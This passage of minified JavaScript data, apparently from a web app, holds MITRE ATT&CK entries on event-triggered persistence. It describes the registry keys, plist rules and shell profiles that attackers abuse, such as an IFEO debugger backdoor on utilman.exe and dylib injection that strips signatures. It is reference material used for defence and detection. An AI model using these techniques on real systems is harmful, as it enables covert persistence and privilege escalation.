\u003Ccode\u003EHKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command\u003C\u002Fcode\u003E. For example: \n* \u003Ccode\u003EHKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command\u003C\u002Fcode\u003E\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fus\u002Fthreat-encyclopedia\u002Fmalware\u002Ftroj_fakeav.gzd'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rJ.external_references=[{source_name:b,external_id:rK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F001"},{external_id:"CAPEC-556",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F556.html"},{url:"https:\u002F\u002Fsupport.microsoft.com\u002Fen-us\u002Fhelp\u002F18539\u002Fwindows-7-change-default-programs",description:"Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.",source_name:"Microsoft Change Default Programs"},{url:"http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fbb166549.aspx",description:"Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.",source_name:"Microsoft File Handlers"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fassoc",description:"Plett, C. et al.. (2017, October 15). assoc. Retrieved August 7, 2018.",source_name:"Microsoft Assoc Oct 2017"},{url:"https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fus\u002Fthreat-encyclopedia\u002Fmalware\u002Ftroj_fakeav.gzd",description:"Sioting, S. (2012, October 8). TROJ_FAKEAV.GZD. Retrieved August 8, 2018.",source_name:"TrendMicro TROJ-FAKEAV OCT 2012"}];rJ["subtechnique-of"]=s;rL.id=rM;rL["object-type"]=a;rL.name="Component Object Model Hijacking";rL.description="Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms694363.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.gdatasoftware.com\u002F2014\u002F10\u002F23941-com-object-hijacking-the-discreet-way-of-persistence'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ";rL.external_references=[{source_name:b,external_id:rM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F015"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms694363.aspx",description:"Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.",source_name:"Microsoft Component Object Model"},{url:"https:\u002F\u002Fblog.gdatasoftware.com\u002F2014\u002F10\u002F23941-com-object-hijacking-the-discreet-way-of-persistence",description:"G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.",source_name:"GDATA COM Hijacking"},{source_name:"Elastic COM Hijacking",description:"Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.",url:"https:\u002F\u002Fwww.elastic.co\u002Fblog\u002Fhow-hunt-detecting-persistence-evasion-com"}];rL["subtechnique-of"]=s;rN.id=rO;rN["object-type"]=a;rN.name="Emond";rN.description="Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003E that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at \u003Ccode\u003E\u002Fsbin\u002Femond\u003C\u002Fcode\u003E will load any rules from the \u003Ccode\u003E\u002Fetc\u002Femond.d\u002Frules\u002F\u003C\u002Fcode\u003E directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path \u003Ccode\u003E\u002Fprivate\u002Fvar\u002Fdb\u002FemondClients\u003C\u002Fcode\u003E, specified in the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003E configuration file at\u003Ccode\u003E\u002FSystem\u002FLibrary\u002FLaunchDaemons\u002Fcom.apple.emond.plist\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.xorrior.com\u002Femond-persistence\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.magnusviri.com\u002FMac\u002Fwhat-is-emond.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fhow-malware-persists-on-macos\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.xorrior.com\u002Femond-persistence\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.magnusviri.com\u002FMac\u002Fwhat-is-emond.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fhow-malware-persists-on-macos\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003E service.";rN.external_references=[{source_name:b,external_id:rO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F014"},{source_name:"xorrior emond Jan 2018",url:"https:\u002F\u002Fwww.xorrior.com\u002Femond-persistence\u002F",description:"Ross, Chris. (2018, January 17). Leveraging Emond on macOS For Persistence. Retrieved September 10, 2019."},{source_name:"magnusviri emond Apr 2016",url:"http:\u002F\u002Fwww.magnusviri.com\u002FMac\u002Fwhat-is-emond.html",description:"Reynolds, James. (2016, April 7). What is emond?. Retrieved September 10, 2019."},{source_name:"sentinelone macos persist Jun 2019",url:la,description:"Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS. Retrieved September 10, 2019."}];rN["subtechnique-of"]=s;rP.id=rQ;rP["object-type"]=a;rP.name="Image File Execution Options Injection";rP.description="Adversaries may establish persistence and\u002For elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., \u003Ccode\u003EC:\\dbg\\ntsd.exe -g  notepad.exe\u003C\u002Fcode\u003E). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.msdn.microsoft.com\u002Fmithuns\u002F2010\u002F03\u002F24\u002Fimage-file-execution-options-ifeo\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Fdebugger\u002Fgflags-overview'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E IFEOs are represented as \u003Ccode\u003EDebugger\u003C\u002Fcode\u003E values in the Registry under \u003Ccode\u003EHKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\u003Cexecutable\u003E\u003C\u002Fcode\u003E where \u003Ccode\u003E&lt;executable&gt;\u003C\u002Fcode\u003E is the binary on which the debugger is attached. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.msdn.microsoft.com\u002Fmithuns\u002F2010\u002F03\u002F24\u002Fimage-file-execution-options-ifeo\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Fdebugger\u002Fregistry-entries-for-silent-process-exit'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Foddvar.moe\u002F2018\u002F04\u002F10\u002Fpersistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Similar to debuggers, silent exit monitoring can be enabled through GFlags and\u002For by directly modifying IFEO and silent process exit Registry values in \u003Ccode\u003EHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Fdebugger\u002Fregistry-entries-for-silent-process-exit'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Foddvar.moe\u002F2018\u002F04\u002F10\u002Fpersistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSimilar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F008'\u003EAccessibility Features\u003C\u002Fa\u003E, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F001'\u003ERemote Desktop Protocol\u003C\u002Fa\u003E will cause the \"debugger\" program to be executed with SYSTEM privileges. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.crowdstrike.com\u002Fregistry-analysis-with-crowdresponse\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSimilar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055'\u003EProcess Injection\u003C\u002Fa\u003E, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562'\u003EImpair Defenses\u003C\u002Fa\u003E by registering invalid debuggers that redirect and effectively disable various system and security applications. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.f-secure.com\u002Fv-descs\u002Fbackdoor_w32_hupigon_emv.shtml'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fsecurity_response\u002Fwriteup.jsp?docid=2008-062807-2501-99&tabid=2'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rP.external_references=[{source_name:b,external_id:rQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F012"},{url:"https:\u002F\u002Fblogs.msdn.microsoft.com\u002Fmithuns\u002F2010\u002F03\u002F24\u002Fimage-file-execution-options-ifeo\u002F",description:"Shanbhag, M. (2010, March 24). Image File Execution Options (IFEO). Retrieved December 18, 2017.",source_name:"Microsoft Dev Blog IFEO Mar 2010"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Fdebugger\u002Fgflags-overview",description:"Microsoft. (2017, May 23). GFlags Overview. Retrieved December 18, 2017.",source_name:"Microsoft GFlags Mar 2017"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-hardware\u002Fdrivers\u002Fdebugger\u002Fregistry-entries-for-silent-process-exit",description:"Marshall, D. & Griffin, S. (2017, November 28). Monitoring Silent Process Exit. Retrieved June 27, 2018.",source_name:"Microsoft Silent Process Exit NOV 2017"},{url:"https:\u002F\u002Foddvar.moe\u002F2018\u002F04\u002F10\u002Fpersistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe\u002F",description:"Moe, O. (2018, April 10). Persistence using GlobalFlags in Image File Execution Options - Hidden from Autoruns.exe. Retrieved June 27, 2018.",source_name:"Oddvar Moe IFEO APR 2018"},{url:rA,description:rB,source_name:rC},{url:C,description:D,source_name:E},{url:"https:\u002F\u002Fwww.f-secure.com\u002Fv-descs\u002Fbackdoor_w32_hupigon_emv.shtml",description:"FSecure. (n.d.). Backdoor - W32\u002FHupigon.EMV - Threat Description. Retrieved December 18, 2017.",source_name:"FSecure Hupigon"},{url:"https:\u002F\u002Fwww.symantec.com\u002Fsecurity_response\u002Fwriteup.jsp?docid=2008-062807-2501-99&tabid=2",description:"Symantec. (2008, June 28). Trojan.Ushedix. Retrieved December 18, 2017.",source_name:"Symantec Ushedix June 2008"}];rP["subtechnique-of"]=s;rR.id=rS;rR["object-type"]=a;rR.name="LC_LOAD_DYLIB Addition";rR.description="Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Fus-15\u002Fmaterials\u002Fus-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rR.external_references=[{source_name:b,external_id:rS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F006"},{url:rT,description:rU,source_name:rV},{url:B,description:ee,source_name:ef}];rR["subtechnique-of"]=s;rW.id=rX;rW["object-type"]=a;rW.name="Netsh Helper DLL";rW.description="Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fbb490939.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at \u003Ccode\u003EHKLM\\SOFTWARE\\Microsoft\\Netsh\u003C\u002Fcode\u003E.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Foutflankbv\u002FNetshHelperBeacon'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fhtmlpreview.github.io\u002F?https:\u002F\u002Fgithub.com\u002FMatthewDemaske\u002Fblogbackup\u002Fblob\u002Fmaster\u002Fnetshell.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rW.external_references=[{source_name:b,external_id:rX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F007"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fbb490939.aspx",description:"Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.",source_name:"TechNet Netsh"},{url:"https:\u002F\u002Fgithub.com\u002Foutflankbv\u002FNetshHelperBeacon",description:"Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.",source_name:"Github Netsh Helper CS Beacon"},{url:"https:\u002F\u002Fhtmlpreview.github.io\u002F?https:\u002F\u002Fgithub.com\u002FMatthewDemaske\u002Fblogbackup\u002Fblob\u002Fmaster\u002Fnetshell.html",description:"Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.",source_name:"Demaske Netsh Persistence"}];rW["subtechnique-of"]=s;rY.id=rZ;rY["object-type"]=a;rY.name="PowerShell Profile";rY.description="Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (\u003Ccode\u003Eprofile.ps1\u003C\u002Fcode\u003E) is a script that runs when \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E starts and can be used as a logon script to customize user environments.\n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E supports several profiles depending on the user or host program. For example, there can be different profiles for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.core\u002Fabout\u002Fabout_profiles?view=powershell-6'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and\u002For \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E drives to gain persistence. Every time a user opens a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E session the modified script will be executed unless the \u003Ccode\u003E-NoProfile\u003C\u002Fcode\u003E flag is used when it is launched. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2019\u002F05\u002F29\u002Fturla-powershell-usage\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwitsendandshady.blogspot.com\u002F2019\u002F06\u002Flab-notes-persistence-and-privilege.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rY.external_references=[{source_name:b,external_id:rZ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F013"},{source_name:"Microsoft About Profiles",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.core\u002Fabout\u002Fabout_profiles?view=powershell-6",description:"Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019."},{source_name:"ESET Turla PowerShell May 2019",url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2019\u002F05\u002F29\u002Fturla-powershell-usage\u002F",description:"Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019."},{source_name:"Wits End and Shady PowerShell Profiles",url:"https:\u002F\u002Fwitsendandshady.blogspot.com\u002F2019\u002F06\u002Flab-notes-persistence-and-privilege.html",description:"DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019."},{url:me,description:mf,source_name:mg}];rY["subtechnique-of"]=s;r_.id=r$;r_["object-type"]=a;r_.name="Screensaver";r_.description="Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FScreensaver'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The Windows screensaver application scrnsave.scr is located in \u003Ccode\u003EC:\\Windows\\System32\\\u003C\u002Fcode\u003E, and \u003Ccode\u003EC:\\Windows\\sysWOW64\\\u003C\u002Fcode\u003E  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (\u003Ccode\u003EHKCU\\Control Panel\\Desktop\\\u003C\u002Fcode\u003E) and could be manipulated to achieve persistence:\n\n* \u003Ccode\u003ESCRNSAVE.exe\u003C\u002Fcode\u003E - set to malicious PE path\n* \u003Ccode\u003EScreenSaveActive\u003C\u002Fcode\u003E - set to '1' to enable the screensaver\n* \u003Ccode\u003EScreenSaverIsSecure\u003C\u002Fcode\u003E - set to '0' to not require a password to unlock\n* \u003Ccode\u003EScreenSaveTimeout\u003C\u002Fcode\u003E - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2017\u002F08\u002Feset-gazer.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";r_.external_references=[{source_name:b,external_id:r$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F002"},{source_name:"Wikipedia Screensaver",description:"Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.",url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FScreensaver"},{source_name:"ESET Gazer Aug 2017",description:"ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.",url:"https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2017\u002F08\u002Feset-gazer.pdf"}];r_["subtechnique-of"]=s;sa.id=sb;sa["object-type"]=a;sa.name="Trap";sa.description="Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The \u003Ccode\u003Etrap\u003C\u002Fcode\u003E command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like \u003Ccode\u003Ectrl+c\u003C\u002Fcode\u003E and \u003Ccode\u003Ectrl+d\u003C\u002Fcode\u003E.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format \u003Ccode\u003Etrap 'command list' signals\u003C\u002Fcode\u003E where \"command list\" will be executed when \"signals\" are received.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fss64.com\u002Fbash\u002Ftrap.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fbash.cyberciti.biz\u002Fguide\u002FTrap_statement'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";sa.external_references=[{source_name:b,external_id:sb,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F005"},{source_name:"Trap Manual",url:"https:\u002F\u002Fss64.com\u002Fbash\u002Ftrap.html",description:"ss64. (n.d.). trap. Retrieved May 21, 2019."},{source_name:"Cyberciti Trap Statements",url:"https:\u002F\u002Fbash.cyberciti.biz\u002Fguide\u002FTrap_statement",description:"Cyberciti. (2016, March 29). Trap statement. Retrieved May 21, 2019."}];sa["subtechnique-of"]=s;sc.id=sd;sc["object-type"]=a;sc.name="Unix Shell Configuration Modification";sc.description="Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F004'\u003EUnix Shell\u003C\u002Fa\u003Es execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (\u003Ccode\u003E\u002Fetc\u003C\u002Fcode\u003E) and the user’s home directory (\u003Ccode\u003E~\u002F\u003C\u002Fcode\u003E) to configure the environment. All login shells on a system use \u002Fetc\u002Fprofile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU\u002FLinux systems, adversaries may add commands that launch malicious binaries into the \u003Ccode\u003E\u002Fetc\u002Fprofile\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fetc\u002Fprofile.d\u003C\u002Fcode\u003E files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fresearch\u002Fkaiji-new-chinese-linux-malware-turning-to-golang\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fbencane.com\u002F2013\u002F09\u002F16\u002Funderstanding-a-little-more-about-etcprofile-and-etcbashrc\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into \u003Ccode\u003E~\u002F.bash_profile\u003C\u002Fcode\u003E, \u003Ccode\u003E~\u002F.bash_login\u003C\u002Fcode\u003E, or \u003Ccode\u003E~\u002F.profile\u003C\u002Fcode\u003E which are sourced when a user opens a command-line interface or connects remotely.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Fillicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwiki.archlinux.org\u002Findex.php\u002FBash#Invocation'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Since the system only executes the first existing file in the listed order, adversaries have used \u003Ccode\u003E~\u002F.bash_profile\u003C\u002Fcode\u003E to ensure execution. Adversaries have also leveraged the \u003Ccode\u003E~\u002F.bashrc\u003C\u002Fcode\u003E file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Funit42-new-iotlinux-malware-targets-dvrs-forms-botnet\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Fillicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Fpulling-linux-rabbit-rabbot-malware-out-of-a-hat'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.sucuri.net\u002F2018\u002F05\u002Fshell-logins-as-a-magento-reinfection-vector.html'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some malware targets the termination of a program to trigger execution, adversaries can use the \u003Ccode\u003E~\u002F.bash_logout\u003C\u002Fcode\u003E file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using \u003Ccode\u003E\u002Fetc\u002Fprofile\u003C\u002Fcode\u003E, \u003Ccode\u003E\u002Fetc\u002Fzshenv\u003C\u002Fcode\u003E, \u003Ccode\u003E\u002Fetc\u002Fzprofile\u003C\u002Fcode\u003E, and 